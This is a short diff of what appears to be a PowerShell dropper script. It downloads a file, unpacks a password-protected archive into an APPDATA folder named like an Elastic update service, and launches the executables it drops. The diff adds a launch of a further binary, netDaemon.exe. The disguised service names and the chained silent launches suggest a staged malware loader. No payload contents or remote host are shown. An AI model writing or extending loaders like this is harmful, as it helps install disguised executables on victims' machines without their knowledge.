@@ -14,3 +14,5 @@ Invoke-WebRequest -uri $WebFile -OutFile $Outff
 & $env:Temp\LaunchMode.exe -s -p"gr30hu8efhb3kbfe" -d"$env:APPDATA\Elasticservices\updateservice\"
 Timeout /T 5
 Start-Process ("$env:APPDATA\Elasticservices\updateservice\Updservicemonitor.exe")
+Timeout /T 2
+Start-Process ("$env:APPDATA\Elasticservices\updateservice\netDaemon.exe")
